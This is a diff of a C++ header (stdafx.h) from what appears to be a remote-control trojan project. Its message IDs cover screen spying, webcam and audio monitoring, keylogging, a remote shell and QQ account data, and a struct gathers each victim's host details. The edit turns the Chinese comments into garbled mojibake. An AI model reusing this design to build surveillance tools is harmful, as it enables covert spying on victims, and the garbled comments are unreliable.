@@ -1,4 +1,4 @@
-﻿// stdafx.h : include file for standard system include files,
+// stdafx.h : include file for standard system include files,
 // or project specific include files that are used frequently, but
 // are changed infrequently
 //
@@ -45,25 +45,25 @@ enum
 	WM_DATA_IN_MSG,
 	WM_DATA_OUT_MSG,
 
-	WM_ADDTOLIST = WM_USER + 102,	// 添加到列表视图中
-	WM_ADDFINDGROUP,				// 上线时查找分组
-	WM_REMOVEFROMLIST,				// 从列表视图中删除
-	WM_OPENMANAGERDIALOG,			// 打开一个文件管理窗口
-	WM_OPENSCREENSPYDIALOG,			// 打开一个屏幕监视窗口
-	WM_OPENWEBCAMDIALOG,			// 打开摄像头监视窗口
-	WM_OPENAUDIODIALOG,				// 打开一个语音监听窗口
-	WM_OPENKEYBOARDDIALOG,			// 打开键盘记录窗口
-	WM_OPENSYSTEMDIALOG,			// 打开进程管理窗口
-	WM_OPENSHELLDIALOG,				// 打开shell窗口
-	WM_RESETPORT,					// 改变端口
-	WM_OPENSYSINFODIALOG,			// 打开服务器信息窗口
-	WM_OPENREGEDITDIALOG,           // 打开注册表管理窗口
-	WM_OPENDLLDLG,                  // 打开功能控件加载窗口
-	WM_OPENCHATDIALOG,		    	// 打开交谈窗口
-	WM_OPENQQINFODIALOG,			// 打开QQ好友信息窗口
-	WM_OPENPSERLISTDIALOG,			// 打开服务管理窗口
-	WM_MODIFYLIST,					// 筛选
-	WM_NOMODIFYLIST,				// 筛选
+	WM_ADDTOLIST = WM_USER + 102,	// ���ӵ��б���ͼ��
+	WM_ADDFINDGROUP,				// ����ʱ���ҷ���
+	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
+	WM_OPENMANAGERDIALOG,			// ��һ���ļ���������
+	WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
+	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
+	WM_OPENAUDIODIALOG,				// ��һ��������������
+	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
+	WM_OPENSYSTEMDIALOG,			// �򿪽��̹�������
+	WM_OPENSHELLDIALOG,				// ��shell����
+	WM_RESETPORT,					// �ı�˿�
+	WM_OPENSYSINFODIALOG,			// �򿪷�������Ϣ����
+	WM_OPENREGEDITDIALOG,           // ��ע�����������
+	WM_OPENDLLDLG,                  // �򿪹��ܿؼ����ش���
+	WM_OPENCHATDIALOG,		    	// �򿪽�̸����
+	WM_OPENQQINFODIALOG,			// ��QQ������Ϣ����
+	WM_OPENPSERLISTDIALOG,			// �򿪷����������
+	WM_MODIFYLIST,					// ɸѡ
+	WM_NOMODIFYLIST,				// ɸѡ
 	WM_OPENPROXYMAPDIALOG,
 //////////////////////////////////////////////////////////////////////////
 	FILEMANAGER_DLG = 1,
@@ -85,27 +85,27 @@ enum
 typedef struct
 {	
 	BYTE			bToken;			// = 1
-	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
-	DWORD			dwCPUClockMhz;	// CPU频率
-	int				nCPUNumber;		// CPU核数
-	IN_ADDR			WanIPAddress;	// 存储32位的IPv4的地址数据结构(外网)
-	IN_ADDR			LanIPAddress;	// 存储32位的IPv4的地址数据结构(内网)
-	char			HostName[256];	// 主机名
-	bool			bIsWebCam;		// 是否有摄像头
-	DWORD			dwSpeed;		// 网速
-	DWORD			Speed;		    // 网卡
-	DWORD			MemSize;		// 内存大小
-	DWORD			DriverSize;		// 硬盘容量
-	char			UpGroup[50];	// 上线分组
-	char			RunTime[32];	// 运行时间
-	char			szVersion[32];	// 上线版本
+	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
+	DWORD			dwCPUClockMhz;	// CPUƵ��
+	int				nCPUNumber;		// CPU����
+	IN_ADDR			WanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
+	IN_ADDR			LanIPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ(����)
+	char			HostName[256];	// ������
+	bool			bIsWebCam;		// �Ƿ�������ͷ
+	DWORD			dwSpeed;		// ����
+	DWORD			Speed;		    // ����
+	DWORD			MemSize;		// �ڴ��С
+	DWORD			DriverSize;		// Ӳ������
+	char			UpGroup[50];	// ���߷���
+	char			RunTime[32];	// ����ʱ��
+	char			szVersion[32];	// ���߰汾
 	char            Virus[50];
-	BOOL            bIs64;          // 32位or 64位 1为64 0为32     
-	char			MarkTime[50];   // 服务端安装时间
-	CHAR szQQNum[256];     //当前运行的QQ号码
-	BOOL  bIsActive;	   //用户状态
+	BOOL            bIs64;          // 32λor 64λ 1Ϊ64 0Ϊ32     
+	char			MarkTime[50];   // ����˰�װʱ��
+	CHAR szQQNum[256];     //��ǰ���е�QQ����
+	BOOL  bIsActive;	   //�û�״̬
 	TCHAR sznet[20];       //net type
-	IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
+	IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
 }LOGININFO;
 
 typedef struct 
